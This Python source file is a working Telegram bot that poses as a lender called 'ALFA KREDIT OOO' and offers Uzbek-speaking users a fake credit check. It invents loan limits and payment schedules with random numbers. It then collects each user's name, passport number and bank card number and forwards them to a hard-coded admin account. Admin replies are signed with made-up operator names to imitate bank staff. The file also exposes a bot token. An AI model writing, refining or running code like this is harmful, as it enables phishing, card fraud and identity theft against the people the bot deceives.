import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import random, time, threading

TOKEN = "8535069565:AAFsXKTEIOWOzIIdOBefrZ3NPCTDvylfZh0"
ADMIN_ID = 7617218565
bot = telebot.TeleBot(TOKEN)

user_data = {}
names = ["Rustam", "Dilshod", "Nodir", "Aziza", "Gulbahor", "Shahzod", "Malika"]

def get_random_operator():
    name = random.choice(names)
    number = random.randint(100, 999)
    return f"{name} {number}"

# ----- /start -----
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("📝 Kreditni tekshirish"))
    bot.send_message(
        chat_id,
        f"🟢 Assalomu alaykum, {message.from_user.first_name}!\n\n"
        "Siz ALFA KREDIT OOO banki bilan bog‘landingiz. "
        "Biz sizning kredit tarixingizni tekshirib, eng qulay foiz stavkasi bilan kredit taklif qilamiz.\n\n"
        "Davom etish uchun pastdagi tugmani bosing 👇",
        reply_markup=markup
    )

# ----- Kreditni tekshirish -----
@bot.message_handler(func=lambda msg: msg.text == "📝 Kreditni tekshirish")
def ask_name(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "📝 Iltimos, ism va familiyangizni kiriting (Misol: Ali Valiyev):")
    bot.register_next_step_handler(message, ask_passport)

def ask_passport(message):
    chat_id = message.chat.id
    user_data[chat_id] = {
        "full_name": message.text,
        "user_id": message.from_user.id,
        "username": message.from_user.username
    }
    bot.send_message(chat_id, "🆔 Passport seriya va raqamini kiriting (Misol: AB 1234567):")
    bot.register_next_step_handler(message, assign_limit)

# ----- Limit ajratish -----
def assign_limit(message):
    chat_id = message.chat.id
    user_data[chat_id]["passport"] = message.text
    rand_million = random.randint(10, 50)
    limit = rand_million * 1_000_000
    user_data[chat_id]["limit"] = limit

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("36 oy"), KeyboardButton("Kamroq summa so‘rash"))

    bot.send_message(chat_id,
        f"{get_limit_color(limit)} Ma’lumotlaringiz muvaffaqiyatli tekshirildi!\n"
        f"Sizga ajratilgan limit: {limit:,} so’m\n\n"
        "📊 Quyidagi tugmalardan birini tanlang:",
        reply_markup=markup
    )

def get_limit_color(limit):
    if limit <= 20_000_000:
        return "🟢"
    elif limit <= 35_000_000:
        return "🟡"
    else:
        return "🔴"

# ----- Kamroq summa so‘rash -----
@bot.message_handler(func=lambda msg: msg.text == "Kamroq summa so‘rash")
def lower_limit(message):
    chat_id = message.chat.id
    old_limit = user_data[chat_id]["limit"]
    decrease = random.randint(2, 5) * 1_000_000
    new_limit = max(old_limit - decrease, 5_000_000)
    user_data[chat_id]["limit"] = new_limit

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("36 oy"))

    bot.send_message(chat_id,
        f"✅ Siz so‘ragan kamroq limit tayyor!\n"
        f"Sizga ajratilgan limit: {new_limit:,} so’m\n\n"
        "📊 Endi kreditni 36 oyga bo‘lishni xohlaysiz?",
        reply_markup=markup
    )

# ----- 36 oy va foiz hisoblash (3 soniyali animatsiya progress + foiz) -----
@bot.message_handler(func=lambda msg: msg.text == "36 oy")
def calc_36_months(message):
    chat_id = message.chat.id
    limit = user_data[chat_id]["limit"]
    interest = 0.19
    months = 36
    total_amount = int(limit * (1 + interest))
    monthly_payment = total_amount // months

    threading.Thread(target=animate_progress, args=(chat_id, limit, total_amount, monthly_payment)).start()

def animate_progress(chat_id, limit, total_amount, monthly_payment):
    bar_length = 20
    total_duration = 3  # 3 soniya
    step_time = total_duration / bar_length

    msg = bot.send_message(chat_id, "📊 36 oy uchun hisoblash boshlanmoqda...")

    for i in range(1, bar_length + 1):
        percent_value = int((i / bar_length) * 100 * limit / 50_000_000)
        color_block = get_color_block(limit)
        progress_bar = color_block * i + "░" * (bar_length - i)

        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=f"📊 36 oy uchun hisob:\n\n"
                 f"Jami to‘lov: {total_amount:,} so'm\n"
                 f"Oyma-oy: {monthly_payment:,} so'm\n\n"
                 f"🔹 Limit progress: [{progress_bar}] {percent_value}%"
        )
        time.sleep(step_time)

    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("Roziman"))
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg.message_id,
        text=f"📊 36 oy uchun hisob tugadi!\n"
             f"Jami to‘lov: {total_amount:,} so'm\n"
             f"Oyma-oy: {monthly_payment:,} so'm\n"
             f"🔹 Limit progress: [{progress_bar}] 100%",
    )
    bot.send_message(chat_id, "Agar rozi bo‘lsangiz, pastdagi tugmani bosing 👇", reply_markup=markup)

def get_color_block(limit):
    if limit <= 20_000_000:
        return "🟢"
    elif limit <= 35_000_000:
        return "🟡"
    else:
        return "🔴"

# ----- Roziman va karta so‘rash -----
@bot.message_handler(func=lambda msg: msg.text == "Roziman")
def ask_card(message):
    chat_id = message.chat.id
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("Karta yuborish"))

    bot.send_message(chat_id,
        "💳 Iltimos, pastdagi tugmani bosib karta raqamingizni yuboring.\n\n"
        "- Faqat sizning ismingizga ro‘yxatdan o‘tgan karta\n"
        "- Hech kimga bermang\n"
        "- Bank hech qachon kod so‘ramaydi\n\n"
        "Misol: 8600123456789012",
        reply_markup=markup
    )

# ----- Karta raqami -----
@bot.message_handler(func=lambda msg: msg.text.isdigit() and len(msg.text) >= 16)
def send_admin(message):
    chat_id = message.chat.id
    user_data[chat_id]["card"] = message.text

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve_{chat_id}"))
    markup.add(InlineKeyboardButton("❌ Rad etish", callback_data=f"reject_{chat_id}"))
    markup.add(InlineKeyboardButton("💬 Javob yozish", callback_data=f"reply_{chat_id}"))

    bot.send_message(ADMIN_ID,
        f"🔔 Yangi so'rov!\n\n"
        f"👤 Ism/Passport: {user_data[chat_id]['full_name']} / {user_data[chat_id]['passport']}\n"
        f"💰 Limit: {user_data[chat_id]['limit']:,} so’m\n"
        f"💳 Karta: {user_data[chat_id]['card']}\n"
        f"Telegram: @{user_data[chat_id]['username']}",
        reply_markup=markup
    )

    bot.send_message(chat_id, "⏳ Sizning arizangiz bank tomonidan tasdiqlanishini kuting...")

# ----- Inline tugmalar -----
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    data = call.data
    chat_id = int(data.split("_")[1])

    if data.startswith("approve_"):
        bot.send_message(chat_id, "✔️ Sizning arizangiz tasdiqlandi! Bank bilan bog‘landik.")
        bot.answer_callback_query(call.id, "Tasdiqladingiz ✅")
    elif data.startswith("reject_"):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Qayta sorov yuborish", callback_data=f"retry_{chat_id}"))
        bot.send_message(chat_id, "❌ Sizning arizangiz rad etildi yoki ma’lumot noto‘g‘ri.", reply_markup=markup)
        bot.answer_callback_query(call.id, "Rad etdiz ❌")
    elif data.startswith("retry_"):
        # Foydalanuvchi qayta sorov bosdi
        bot.send_message(chat_id, "🔄 Qayta sorov boshlanmoqda...")
        start(bot.get_chat(chat_id))  # /start funksiyasini chaqirib, jarayonni qayta boshlash
    elif data.startswith("reply_"):
        bot.answer_callback_query(call.id, "✏️ Javob yozing va yuboring.")
        msg = bot.send_message(ADMIN_ID, "💬 Iltimos, foydalanuvchiga yuboriladigan xabarni yozing:")
        bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, chat_id))

# ----- Admin javobi (random operator) -----
def send_reply_to_user(message, chat_id):
    operator = get_random_operator()
    bot.send_message(chat_id, f"💬 Xabar:\n\n{message.text}\n— Operator: {operator}")
    bot.send_message(ADMIN_ID, "✅ Xabar foydalanuvchiga yuborildi!")

# ----- Bot ishga tushurish -----
bot.infinity_polling()
